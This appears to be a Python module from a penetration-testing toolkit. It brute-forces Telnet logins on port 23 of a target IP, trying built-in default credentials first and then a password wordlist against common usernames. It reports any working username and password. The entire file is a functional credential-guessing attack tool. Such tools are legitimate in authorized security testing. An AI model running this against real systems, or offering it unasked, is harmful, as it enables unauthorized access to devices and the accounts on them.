import telnetlib3
import asyncio
import socket
import os
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from app.utility.colors import C

REQUIRED_OPTIONS = {"IP": "", "PASS": ""}
SYM_SUCCESS = "🔑"
SYM_FAILED = "🔒"


async def test_telnet(target_ip, port, username, password):
    """
    Attempting Telnet login using telnetlib3 with prompt-based interaction.
    """
    try:
        reader, writer = await telnetlib3.open_connection(
            host=target_ip, port=int(port), connect_minwait=0.05, connect_maxwait=2.5
        )

        # Look for a login (e.g.: "login:")
        await asyncio.wait_for(reader.readuntil("login: "), timeout=1)
        writer.write(username + "\n")

        # Look for a password prompt (e.g.: "Password:")
        await asyncio.wait_for(reader.readuntil("Password: "), timeout=1)
        writer.write(password + "\n")

        # Read the response looking for a shell prompt ($ or #)
        try:
            result = await asyncio.wait_for(reader.readuntil("$"), timeout=1.5)
        except asyncio.TimeoutError:
            result = await asyncio.wait_for(reader.readuntil("#"), timeout=1.5)

        writer.close()

        # Verification
        return "$" in result or "#" in result

    except KeyboardInterrupt:
        return False
    except (asyncio.TimeoutError, socket.timeout, socket.error, EOFError):
        return False
    except Exception:
        return False


async def _execute_async(options):
    """Operate BruteForce Telnet"""
    target_ip = options.get("IP")
    port = 23
    wordlist_path = options.get("PASS")

    print(f"{C.HEADER}--- TELNET BRUTE FORCE: {target_ip} ---")

    # ---------------------------------------------
    # Stage 1: Kredensial Default
    # ---------------------------------------------
    print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default")
    found_weak_creds = False

    try:
        for user, passwd in DEFAULT_CREDS:
            if await test_telnet(target_ip, port, user, passwd):
                print(
                    f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{user} P:{passwd}"
                )
                found_weak_creds = True
                break
            print(f"{C.MENU}  {SYM_FAILED} FAIL: {user}:{passwd}")

        if found_weak_creds:
            return

        # ---------------------------------------------
        # Stage 2: Brute Force Wordlist
        # ---------------------------------------------
        if wordlist_path and os.path.exists(wordlist_path):
            print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force {wordlist_path}")

            try:
                with open(wordlist_path, "r", encoding="latin-1") as f:
                    for target_user in COMMON_USERS:
                        f.seek(0)
                        for line in f:
                            passwd = line.strip()
                            if not passwd:
                                continue
                            if await test_telnet(target_ip, port, target_user, passwd):
                                print(
                                    f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{target_user} P:{passwd}"
                                )
                                return
                            print(
                                f"{C.MENU}  [>] TRY: U:{target_user:<20} P:{passwd:<20}",
                                end="\r",
                                flush=True,
                            )

                    print(f"{C.MENU} [!] Brute Force finish.")

            except Exception as e:
                print(f"{C.ERROR}\n[!] ERROR: {e}")
        else:
            print(f"\n{C.MENU}  {SYM_FAILED} All passwords are incorrect.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"{C.ERROR}[x] GLOBAL ERROR: {e}")


def execute(options):
    try:
        asyncio.run(_execute_async(options))
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(_execute_async(options))
